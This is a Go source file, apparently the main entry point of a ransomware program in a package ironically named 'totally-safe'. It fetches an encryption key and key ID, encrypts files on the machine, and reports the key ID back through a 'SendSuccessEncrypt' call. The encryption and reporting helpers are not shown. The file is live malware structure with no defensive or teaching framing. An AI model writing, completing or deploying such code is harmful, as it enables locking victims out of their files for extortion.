package main

import (
	"fmt"
	"github/BryanMwangi/totally-safe/exe/Crypto"
	"github/BryanMwangi/totally-safe/exe/Models"
	"github/BryanMwangi/totally-safe/exe/Utils"
	"log"
)

func main() {
	var KeyValues Models.KeyResponse

	KeyValues, err := Utils.UnMarshalKey()
	if err != nil {
		panic(err)

	}
	key := KeyValues.Key
	keyId := KeyValues.KeyId

	done, err := Crypto.GetAndEncryptFiles(key)
	if err != nil {
		log.Fatalf("Failed to encrypt files: %v", err)
		panic(err)
	}
	if done {
		Utils.SendSuccessEncrypt(keyId)
		fmt.Println("Files encrypted successfully.")
		return
	} else {
		Utils.SendSuccessEncrypt(keyId)
		fmt.Println("Failed to encrypt files")
		return
	}
}
